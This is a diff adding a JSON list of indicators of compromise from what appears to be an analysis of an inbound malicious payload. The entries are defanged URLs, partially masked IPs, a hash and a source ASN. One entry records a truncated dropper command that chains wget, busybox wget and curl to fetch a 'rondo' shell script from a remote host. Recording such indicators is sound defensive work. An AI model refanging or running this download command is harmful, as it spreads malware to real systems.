@@ -1,0 +1,39 @@
+[
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://45[.]153[.]34[.]XXX/rondo."
+  },
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "190[.]179[.]168.XXX"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "45[.]153[.]34.XXX"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "(wget -qO- hxxp://45[.]153[.]34[.]XXX/rondo.``dgx.sh||busybox wget -qO- hxxp://45[.]153[.]34[.]XXX/rondo.``dgx.sh||curl -s hxxp://45"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "a84e3cc23877f5d8e92f8133eea8d7a2a6e62802e8a350945eb2c09d1fe68932"
+  },
+  {
+    "asn": "Storm Industries LLC",
+    "country": "The Netherlands",
+    "role": "artifact_source",
+    "type": "ip",
+    "value": "94[.]154[.]43.XXX"
+  }
+]
